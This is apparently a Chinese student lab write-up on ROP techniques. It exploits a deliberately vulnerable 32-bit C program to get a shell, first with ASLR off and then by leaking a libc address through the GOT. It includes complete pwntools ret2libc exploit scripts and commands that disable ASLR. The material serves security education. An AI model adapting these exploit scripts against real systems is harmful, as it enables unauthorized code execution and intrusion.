---
title: ROP技术 
date: 2019-10-22 09:50:08 
tags:
  - "网络空间安全"
  - "软件安全"
categories:
  - ["实验","漏洞分析"]
  - ["漏洞","缓冲区溢出"]
comments: true 
mathjax: true

---

## 实验目的

了解ROP技术的原理和应用，学会利用ROP技术绕过安全保护。
<!-- more -->

## 步骤

### canary+ASLR off，NX on下getshell

{% note primary %}

#### 准备工作

{% tabs prepare,1 %}
<!-- tab 关闭ASLR -->
执行以下shell命令 {% codeblock lang:bash line_number:false %} echo 0 > /proc/sys/kernel/randomize_va_space {% endcodeblock %}
{% asset_img 1-0.png %}
<!-- endtab -->
<!-- tab 开启NX-->
gcc编译时加入`-z noexecstack`参数 {% codeblock lang:bash line_number:false %} gcc -znoexecstack -fno-stack-protector rop1.c -o
rop1 -m32 {% endcodeblock %}
<!-- endtab -->
<!-- tab 确认ASLR和栈保护canary已关闭 -->
使用`checksec`命令检查 {% codeblock lang:bash line_number:false %} checksec --file ./rop1 {% endcodeblock %} {% asset_img
1-1.png %}
<!-- endtab -->
{% endtabs %} {% endnote %}

其中`rop1.c`的源码如下 {% codeblock rop1.c lang:c %}

# include <stdio.h>

void vuln(){ char buf[128]; read(0,buf,256); } int main(){ vuln(); write(1,"hello vuln\n",10); } {% endcodeblock %}

`vuln`函数中，有一个128字节长的`char`数组作为“缓冲区”，然后调用`read()`读入了256字节，此时很容易造成程序溢出。我们要利用这个漏洞向“缓冲区”`buf`
写入shellcode，劫持程序流，把返回地址改为恶意代码地址(`bin/sh`)
{% asset_img 1-2.png "利用示意图" %}

下面进入gdb调试过程： {% note warning %} 本次使用目标文件为`rop2`——但源码仍然为`rop1.c`
{% endnote %}

1. Buffer的有效地址为`ebp-0x88`，ebp距离返回地址又有`0x4`的距离，所以在覆盖返回地址前，先要填充`0x88+0x4=0x8c`
   段距离。由于NX开启，栈上代码不可执行，所以我们需要使用系统调用`system("bin/sh")`。 {% asset_img 1-3.png %}
2. 首先确定`system`的地址。 {% asset_img 1-4.png "system的地址是0xf7e40da0" %} 由于ASLR还是关闭状态，所以`system`地址固定，可以通过`system`地址来调用`system`
   函数，`/bin/sh`字符串可以在程序所使用的`libc.so`链接库中寻找，也是固定的。
3. 接下来，寻找字符串`bin/sh`的地址。由于gdb的调试环境会影响buf变量在内存中的地址，故需要在python脚本中开启调试，使用`gdb.attach()`
   即可，然后运行python脚本。会开启一个新的shell窗口，在其中执行`vmmap`查看其引用的`libc.so`地址 {% codeblock lang:python line_number:false %} p =
   process("./rop2")
   gdb.attach(p,'b vuln')
   {% endcodeblock %} {% asset_img 1-5.png %}
4. 下图表明该程序引用了2.23版本的libc库，地址范围为`0xf7e06000~0xf7fb9000`，接着在其中寻找`bin/sh`字符串 {% note warning %}
   这里有个小坑点，gdb-peda输出结果有微小不同，从而导致找不到`bin/sh`字符串，不知道是什么问题导致的 {% endnote %} {% asset_img 1-6.png %} {% asset_img 1-7.png "
   bin/sh在地址0xf7f61a0b处" %}
5. 刚才的程序继续后其实也是一个`/bin`程序，只不过其中没有什么命令。但是从没有`Hello rop`输出来看，程序控制流已经被改变了。 {% asset_img 1-10.png %}
6. 最终payload代码如下。先填充足够的字符`a`占满缓冲区，再填入`system`函数的地址，由于getshell后没有其他事情可做，返回地址随便填，然后跟入`/bin/sh`的地址作为参数 {% codeblock
   payload1.py lang:python line_number:false %} from pwn import *

p = process('./rop2')

# gdb.attach(p,'b vuln')

sys_addr=0xf7e40da0 binsh_addr=0xf7f61a0b payload = 'a'*0x8c + p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr)

p.sendline(payload)
p.interactive()
{% endcodeblock %} {% asset_img 1-12.png "Getshell成功" %}

### canary off，NX+ASLR on下getshell

{% note primary %}

#### 准备工作

{% tabs prepare2,1 %}
<!-- tab 开启ASLR -->
执行以下shell命令 {% codeblock lang:bash %} echo 2 > /proc/sys/kernel/randomize_va_space {% endcodeblock %} {% asset_img
2-0.png %}
<!-- endtab -->
<!-- tab 准备<code>libc.so</code> -->
从目录 <code>/lib/i386-linux-gnu/libc-2.23.so</code>中拷贝出系统的so文件，复制到文件夹下。
<!-- endtab -->
{% endtabs %} {% endnote %} 由于地址随机化，不可以直接获取system的地址，但是`libc.so`中各函数的相对位置不变，可以利用泄露出的某函数地址与`system`函数之间取偏移值，计算`system`
函数的地址和`/bin/sh`字符串的地址，就可以使用ret2libc方法getshell。

1. 在脚本中，使用`gdb.attach`并打指令`b vuln`，在`vuln`函数下断点。 利用`disass vuln`查看`vuln`函数汇编，得到`vuln`函数首地址为`0x804843b`。 {% asset_img
   2-6.png %} {% note info %} 另外一种算法是：在backtrace可以看到`0x804845a`是vuln+31的位置(如图)，计算得知 $$ vulnAddr=\left(804845a\right )
   \_{16}-\left(31\right )_{16}+\left(4\right )\_{16}=\left(804843b\right )\_{16} $$ {% asset_img 2-1.png %} {% endnote
   %}
2. 继续运行程序，在寄存器中可以看到got表泄露的`write`绝对地址`0xf7644b70`与其在程序中的地址`0x804a014`。`write`函数所在got表中的相对偏移量为+20，说明got表的基地址为`0x804a000`
   。立刻执行`print system`，看到此时`libc_system`的地址是`0xf75a9da0`。 {% asset_img 2-2.png "得知got表和libc_system的地址" %}
3. 执行`plt`命令，看到`write`函数的`plt`地址为`0x8048320`。 {% asset_img 2-5.png %}
4. 使用`vmmap`和`find`命令寻找`/bin/sh`的地址。 {% grouppicture 2-2 %} {% asset_img 2-3.png %} {% asset_img 2-4.png "
   字符串/bin/sh的地址为0xf76caa0b" %} {% endgrouppicture %}
5. 计算字符串`/bin/sh`相对偏移量为 $$ \left(f76caa0b\right )\_{16}-\left(f75a9da0\right )\_{16}=\left(120c6b\right )\_{16} $$
   ROP所需要的东西都齐备了。
6. 但是在实际getshell的过程中，我们需要以脚本的方式来自动化完成泄露地址->寻找相对差值->
   写shellcode的过程，所以需要pwn库的一些额外功能。由于只有在程序运行时，才会加载系统库，所以需要预先发送一个payload，此payload用于泄露地址，计算出`/bin/sh`
   的相对位移后，第二步的payload才会“击中要害”。
7. Pwn的ELF模块用于获取ELF文件的信息，用法是`elf=ELF('sofile_name')`，我们要在这里拿`write`函数的got表和plt表地址，可以直接用`elf.got["write"]`
   ，`elf.plt["write"]`获得，至于寻找`/bin/sh`字符串，可以用`next(elf.search('/bin/sh'))`获得。
8. 最终payload代码如下 {% codeblock payload2.py lang:python %} from pwn import *

p =process('./rop2')
libc = ELF('./libc.so')

# gdb.attach(p,'b vuln')

write_got = 0x804a014 write_plt = 0x8048320 vuln_addr = 0x804843b

log.info('leaking addr from write got&plt')
rop1 = p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)
payload1='a'*0x8c + rop1 p.sendline(payload1)

write_addr = u32(p.recv(4))
sys_addr = write_addr - (libc.symbols['write']-libc.symbols['system'])
binsh_addr = write_addr - (libc.symbols['write']-next(libc.search('/bin/sh')))

log.info('write_addr:%#x'%write_addr)
log.info('write in libc.symbols:%#x'%libc.symbols['write'])
log.info('system in libc.symbols:%#x'%libc.symbols['system'])
log.info('/bin/sh absolute addr:%#x'%next(libc.search('/bin/sh')))
log.info('system_addr:%#x'%sys_addr)
log.info('binsh_addr:%#x'%binsh_addr)
log.info('sending final payload')
rop2 = p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr)
payload2='a'*0x8c+rop2 p.sendline(payload2)

p.interactive()
{% endcodeblock %} 其中第一步先向`vuln_addr`写入`write`函数的地址，以获得泄露的`write`函数绝对地址。然后，根据系统库的相对偏移计算出`/bin/sh`
的地址，最终的payload是填充`0x8c个字符"a"+sys_addr+sys_addr的返回地址（随意指定一个不存在的值）+binsh_addr`。观察上述脚本，我还发现，`/bin/sh`的地址其实可以直接用`write`
和`/bin/sh`的相对差值来算，不需要再单独算出`sys_addr`。 {% asset_img 2-7.png "Getshell成功截图" %}

## 实验难点及收获

本次实验的难点和最大的收获都在于payload的构造方法。这次通过两个实验，了解到了利用ROP技术绕过NX和ASLR保护的方法，了解到shellcode `system("/bin/sh")`
在此时的一般构造格式为`溢出填充字符+p32(sys_addr)+p32(system的返回地址，一般指定一个不存在的地址)+p32(binsh_addr)`，`sys_addr`
可以在ASLR关闭的情况下直接gdb调试观察，或者在ASLR开启时通过泄露libc某函数的地址，算出相对差值以获得。

本次实验所使用的程序都是32位程序，实际上还有很多64位程序会用到相似的思路，不过64位程序需要借助gadget，这是以后要进一步学习的内容了。

## 实验思考

问题：为什么明明pwndbg和gdb-peda对于vmmap中libc-2.23.so的起始终止地址输出均相同，但是在gdb-peda中找不到`/bin/sh`呢？ {% grouppicture 3-1 %} {% asset_img
1坑点.png %} {% asset_img 2-3.png %} {% asset_img 2-4.png %} {% endgrouppicture %}
